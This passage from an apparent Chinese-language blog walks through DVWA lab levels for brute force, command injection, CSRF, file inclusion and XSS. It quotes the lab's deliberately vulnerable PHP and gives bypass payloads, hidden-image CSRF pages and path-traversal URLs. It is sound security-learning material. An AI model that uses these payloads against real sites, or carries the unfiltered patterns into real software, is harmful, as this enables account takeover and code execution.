title="high"></a>high</h4><p>还用之前的方法进行尝试，发现除了第一个包返回正常，其他的都显示302。看来之前的方法行不通了。</p><p>看看源代码。好像多加了一个参数，没思路。看看别人怎么搞的。</p><p>有token验证。抓包使用pitchfork模式。添加爆破的参数。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjv4tbaij30yp0dxgn8.jpg"/><p>对攻击的模块做一些配置，线程设为1个线程。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjvh80z7j30yu0gb75a.jpg"/><p>允许重定向。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjvu60cnj30hr05wjrh.jpg"/><p>在Option中Grep-Extract模块，添加筛选条件，获得user_token。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjwi50ejj30ss0pewhr.jpg"/><p>为了能够成功破解，把字典缩小了一下，并将其正确的账号和密码对应起来，才成功爆破。要是不知道账号密码，爆破起来还是很困难的。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjwv4mgej30ud0i076a.jpg"/><p>我觉得这样pitchfork爆破有点鸡肋，必须账号字典和密码字典刚好一一对应起来才能爆破成功。总之爆破成功不太容易。</p><p>使用交叉爆破模式，三个参数又比较费时间。太难了。</p><h4 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h4><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjx4caapj30no0asdgd.jpg"/><p>输错一次就要等15分钟，GG。暴力破解基本没得搞。</p><h3 id="DVWA命令执行漏洞"><a href="#DVWA命令执行漏洞" class="headerlink" title="DVWA命令执行漏洞"></a>DVWA命令执行漏洞</h3><h4 id="什么是命令执行漏洞"><a href="#什么是命令执行漏洞" class="headerlink" title="什么是命令执行漏洞"></a>什么是命令执行漏洞</h4><p>命令执行漏洞的原理：在操作系统中，&amp;、&amp;&amp;、|、||都可以作为命令连接符使用，用户通过客户端提交执行命令，服务器端未做过滤，导致命令执行成功的过程。</p><h4 id="amp-、-amp-amp-、-、-命令拼接符的区别"><a href="#amp-、-amp-amp-、-、-命令拼接符的区别" class="headerlink" title="&amp;、&amp;&amp;、|、||命令拼接符的区别"></a>&amp;、&amp;&amp;、|、||命令拼接符的区别</h4><p>A&amp;B           简单的拼接，AB间无制约关系</p><p>A&amp;&amp;B        A执行成功，然后再执行B</p><p>A|B            A的输出，作为B的输入</p><p>A||B          A执行失败，然后再执行B  </p><hr><h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><p>查看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) {    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    }    else {        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    }    // Feedback for the end user    $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p>输入一个IP试一下。<code>127.0.0.1</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjxk3zogj30v30dimza.jpg"/><p>返回正常，尝试添加其他命令。<code>127.0.0.1&amp;ipconfig</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjy7euevj30uv0odjvo.jpg"/><p>&amp;两边的命令都被成功执行。<code>127.0.0.1&amp;&amp;ipconfig</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjygltrbj30uv0oy42u.jpg"/><p>&amp;&amp;两边的命令都被成功执行。<code>127.0.0.1|ipconfig</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjyq07zrj30v20nzq6g.jpg"/><p>经过验证表明，<code>|</code>前面的命令不会被执行。只执行后面的命令。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjyzbmyaj30ne08tt96.jpg"/><p>使用<code>||</code>命令试一下，<code>127.0.0.1||ipconfig</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjz9feeoj30v10kh0vz.jpg"/><p>发现<code>||</code>前的命令必须是错误的才能执行<code>||</code>后的命令。否则只执行<code>||</code>前的命令。</p><h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><p>首先，查看源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) {    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Set blacklist    $substitutions = array(        &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,        &#39;;&#39;  =&gt; &#39;&#39;,    );    // Remove any of the charactars in the array (blacklist).    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    }    else {        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    }    // Feedback for the end user    $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p>发现只过滤了两个符号。</p><blockquote><pre><code class="php">$substitutions = array(    &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,    &#39;;&#39;  =&gt; &#39;&#39;,);</code></pre></blockquote><p>那么其他&amp;、|、||仍然能够使用。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjzksq2nj30nl0c23zd.jpg"/><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjzscr8lj30n00k9jty.jpg"/><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk004ok9j30nb0hc0uu.jpg"/><h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><p>先查看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) {    // Get input    $target = trim($_REQUEST[ &#39;ip&#39; ]);    // Set blacklist    $substitutions = array(        &#39;&amp;&#39;  =&gt; &#39;&#39;,        &#39;;&#39;  =&gt; &#39;&#39;,        &#39;| &#39; =&gt; &#39;&#39;,        &#39;-&#39;  =&gt; &#39;&#39;,        &#39;$&#39;  =&gt; &#39;&#39;,        &#39;(&#39;  =&gt; &#39;&#39;,        &#39;)&#39;  =&gt; &#39;&#39;,        &#39;`&#39;  =&gt; &#39;&#39;,        &#39;||&#39; =&gt; &#39;&#39;,    );    // Remove any of the charactars in the array (blacklist).    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    }    else {        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    }    // Feedback for the end user    $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p>仍然是过滤符号，发现<code>&#39;| &#39;</code>多了一个空格。于是我们使用|绕过。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk07w955j30nb0btmy0.jpg"/><h4 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h4><p>查看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    $target = stripslashes( $target );    // Split the IP into 4 octects    $octet = explode( &quot;.&quot;, $target );    // Check IF each octet is an integer    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) {        // If all 4 octets are int&#39;s put the IP back together.        $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];        // Determine OS and execute the ping command.        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {            // Windows            $cmd = shell_exec( &#39;ping  &#39; . $target );        }        else {            // *nix            $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );        }        // Feedback for the end user        $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;    }    else {        // Ops. Let the user name theres a mistake        $html .= &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;;    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>用<code>|net user</code>试一下。发现被要求输入正确的IP。注入失败。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk0weg12j30nf094q3l.jpg"/><p>直接限制了输入的格式，有效的防止了命令注入漏洞。</p><h3 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h3><p>跨站请求伪造是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟XSS相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，<strong>CSRF</strong> 利用的是网站对用户网页浏览器的信任。</p><p>攻击者构建好对目标网站伪造的请求，并把该请求放入自己的网站中，诱使受害者访问攻击者搭建的网站，如果受害者刚好在目标网站登陆过且目标网站存在该漏洞。那么攻击者伪造的请求就会成功执行。这是我自己的理解。</p><h4 id="CSRF漏洞检测"><a href="#CSRF漏洞检测" class="headerlink" title="CSRF漏洞检测"></a>CSRF漏洞检测</h4><blockquote><p> 检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p></blockquote><h4 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h4><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk1e5p8xj30nt09hwex.jpg"/><p><code>http://192.168.1.132/dvwa/vulnerabilities/csrf/?password_new=1234&amp;password_conf=1234&amp;Change=Change#</code></p><p>当受害者点击这个链接，他的密码就会被修改。这个攻击链接很明显。真正攻击场景会对链接做一些处理。比如网址缩短。</p><p>攻击者在网站上搭建攻击页面。如下图所示。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk1n1yjqj30l8072mxa.jpg"/><p>该页面源代码为：</p><pre><code class="html">&lt;html&gt;&lt;head&gt;&lt;title&gt;404&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=&quot;http://192.168.1.132/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;h1&lt;h2&gt;file not found.&lt;h2&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>在受害者点击后成功修改密码。</p><h4 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h4><blockquote><p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.1.132），希望通过这种机制抵御CSRF攻击。</p></blockquote><p>过滤规则是http包头的Referer参数的值中必须包含受害者主机名（这里是192.168.1.132）</p><p>我们可以将攻击页面命名为192.168.1.132.html（页面被放置在攻击者的服务器里，这里是192.168.1.129）就可以绕过了。</p><p>在攻击端搭建网站，先搭建了一个主页index.html。链接使用的是短链接（有效期7天），就是密码修改链接。</p><pre><code class="html">&lt;!-- /*超链接，点击跳转*/ --&gt;&lt;html&gt;&lt;body&gt;&lt;a href=&quot;192.168.1.132.html&quot; target=&quot;_blank&quot;&gt;11111111&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>有搭建了一个静态页面，192.168.1.132.html</p><pre><code class="html">&lt;html&gt;&lt;head&gt;&lt;title&gt;404&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=&quot;http://suo.im/6nTcXO&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;h1&lt;h2&gt;file not found.&lt;h2&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>在受害者访问这个页面并点击超链接，密码才会被修改。</p><h4 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h4><blockquote><p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p></blockquote><p>搞不出来，不会写代码。就这样吧。什么时候会写代码了再说吧。orz</p><h4 id="impossible-2"><a href="#impossible-2" class="headerlink" title="impossible"></a>impossible</h4><blockquote><p>Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p></blockquote><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含漏洞是“代码注入“的一种。代码注入的原理就是注入一段用户能控制的脚本或代码，并让服务端执行。</p><h4 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h4><p>打开测试文件包含漏洞。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3dH8H.png" alt="Y3wP2.png"></p><p>发现有三个文件，点开后发现URL发生了变化，由<code>http://192.168.1.132/dvwa/vulnerabilities/fi/?page=include.php</code>变成了<code>http://192.168.1.132/dvwa/vulnerabilities/fi/?page=file1.php</code></p><p><img src="https://s1.ax1x.com/2020/05/10/Y3BS3Q.png" alt="Y3BS3Q.png"></p><p>通过./实现不同目录间的访问。</p><blockquote><p>/         根目录<br>./        是当前目录<br>../  返回到上一级目录<br>../../ 返回了两级目录<br>.\ 、..\和./、../意义相同</p></blockquote><p>通过URL可以随意修改要访问的文件。<code>http://192.168.1.132/dvwa/vulnerabilities/fi/?page=..\..\..\..\..\..\wamp\www\dvwa\phpinfo.php</code></p><p><img src="https://s1.ax1x.com/2020/05/10/Y3BAEV.png" alt="Y3BAEV.png"></p><p>查看源代码</p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];?&gt;</code></pre><p>从源代码我们可以看到，没有做任何过滤。</p><h4 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h4><p>查看源代码</p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );?&gt;</code></pre><p><img src="https://s1.ax1x.com/2020/05/10/Y30I9e.png" alt="Y30I9e.png"></p><p>过滤了<code>http://</code>,<code>https://</code>,<code>../</code>,<code>..\</code>但仍可以使用绝对路径、双写绕过。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3BeCF.png" alt="Y3BeCF.png"></p><h4 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h4><p>查看源代码</p><pre><code class="\">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {    // This isn&#39;t the page we want!    echo &quot;ERROR: File not found!&quot;;    exit;}?&gt;</code></pre><p>使用file协议绕过。</p><h4 id="impossible-3"><a href="#impossible-3" class="headerlink" title="impossible"></a>impossible</h4><p>查看源代码</p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {    // This isn&#39;t the page we want!    echo &quot;ERROR: File not found!&quot;;    exit;}?&gt;</code></pre><p>分析源码可以看到,使用白名单,page只能为include.php”、“file1.php”、“file2.php”、“file3.php”之一，只允许包含include.php、file1.php、file2.php、file3.php，不能包含别的文件，彻底杜绝文件包含漏洞</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3B3E6.png" alt="Y3B3E6.png"></p><h3 id="XSS（跨站脚本攻击）"><a href="#XSS（跨站脚本攻击）" class="headerlink" title="XSS（跨站脚本攻击）"></a>XSS（跨站脚本攻击）</h3><p>跨站脚本攻击(CrossSite Scripting)，为了和层叠样式表(CascadingStyle Sheets,CSS)的缩写进行区分，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><h4 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h4><p>通过脚本语言注入篡改网页，插入恶意脚本，控制用户浏览器的攻击行为。</p><blockquote><p>XSS分为反射型xss、存储型xss和基于DOM的xss。</p></blockquote><p>反射型xss和基于DOM的xss都属于非持久性攻击。存储型xss属于持久性攻击。</p><hr><h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h4><h5 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h5><p>先查看一下源代码，发现没有任何过滤。</p><pre><code class="php">&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Feedback for end user    $html .= &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;;}?&gt;</code></pre><p><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk21a9uyj30n905bglu.jpg"/><h5 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h5><p>看一下源代码：</p><pre><code class="php">&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Get input    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p>在输入框输入<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk2q6wc0j30nl0570t0.jpg"/><p><code>&lt;script&gt;</code>被过滤掉了。使用<code>&lt;scr&lt;script&gt;ipt&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk385v0sj30lh05nt8s.jpg"/><p>除此之外，使用大小写也可以绕过。<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk3nrosxj30n705hjrm.jpg"/><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk45rnczj30ky05qq30.jpg"/><h5 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h5><p>看一下源代码：</p><pre><code class="php">&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Get input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p>发现使用了正则表达式进行过滤</p><blockquote><p>$name = preg_replace( ‘/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/i’, ‘’, $_GET[ ‘name’ ] );</p></blockquote><p><code>&lt;script&gt;</code>标签被过滤。但仍然可以使用img、body、iframe等其他标签注入恶意的js代码。</p><p><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk4u10jlj30kz05ojrg.jpg"/><p><code>&lt;svg onload=alert(/xss/)&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk56hhptj30ks05mq30.jpg"/><h5 id="impossible-4"><a href="#impossible-4" class="headerlink" title="impossible"></a>impossible</h5><p>看一下源代码：</p><pre><code class="php">&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $name = htmlspecialchars( $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>看到有一个<code>htmlspecialchars（）函数</code> 。</p><p>这个函数的功能：把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体。</p><p>无法构造标签进行攻击。</p><h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><h5 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h5><p>看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Sanitize name input    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><p>把代码插入到消息框中。<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk5kzhd8j30n706bwes.jpg"/><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk5uzd0wj30it05mt8o.jpg"/><p>成功。</p><h5 id="medium-5"><a href="#medium-5" class="headerlink" title="medium"></a>medium</h5><p>看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><p>查看源代码，发现message有htmlspecialchars()函数，因此没法使用message进行xss。</p><blockquote><p>$message = htmlspecialchars( $message );</p></blockquote><p>发现name没有做实体化限制。因此在name处进行注入。输入代码，发现输入长度被限制了。通过浏览器控制台进行修改。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk6btuzqj30nd069wes.jpg"/><p>仍然是使用<code>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;</code>绕过，或使用大小写。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk6ojajnj30ik05mq2w.jpg"/><p>使用大小写绕过。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk6zisnwj30no06iwes.jpg"/><p>成功。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk7hiabkj30ik05imx4.jpg"/><h5 id="high-5"><a href="#high-5" class="headerlink" title="high"></a>high</h5><p>看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><p>查看源代码，和之前一样。</p><blockquote><p>$message = htmlspecialchars( $message );</p><p>$name = preg_replace( ‘/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/i’, ‘’, $name );</p></blockquote><p>从name处使用其他标签进行xss注入。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk7z4gwoj30nc068aac.jpg"/><p>成功注入。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk88swh4j30ie05odfs.jpg"/><h5 id="impossible-5"><a href="#impossible-5" class="headerlink" title="impossible"></a>impossible</h5><p>看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = stripslashes( $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not 